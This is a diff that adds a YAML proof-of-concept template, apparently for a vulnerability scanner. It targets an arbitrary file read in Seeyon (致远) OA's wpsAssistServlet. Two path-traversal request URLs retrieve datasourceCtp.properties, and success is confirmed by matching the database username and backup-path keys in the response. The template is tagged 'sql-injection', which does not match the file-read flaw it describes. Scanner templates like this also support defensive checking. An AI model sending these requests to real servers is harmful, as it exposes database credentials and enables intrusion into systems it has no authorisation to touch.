@@ -1,0 +1,16 @@
+id: poc-yaml-seeyon-wpsAssistservlet-file-read
+info:
+  name: 致远OA wpsAssistServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 致远互联-OA
+variables:
+  path: '/seeyon/wpsAssistServlet?flag=open&fileId=-1233531&fileType=/../../conf/datasourceCtp.properties
+
+    /seeyon/wpsAssistServlet?flag=template&templateUrl=../../base/conf/datasourceCtp.properties'
+requests:
+- method: GET
+  path: '{{.path}}'
+  expression: status_code == 200 && contains(body,"mysql.backup.path=") && contains(body,"ctpDataSource.username")
+transport: http
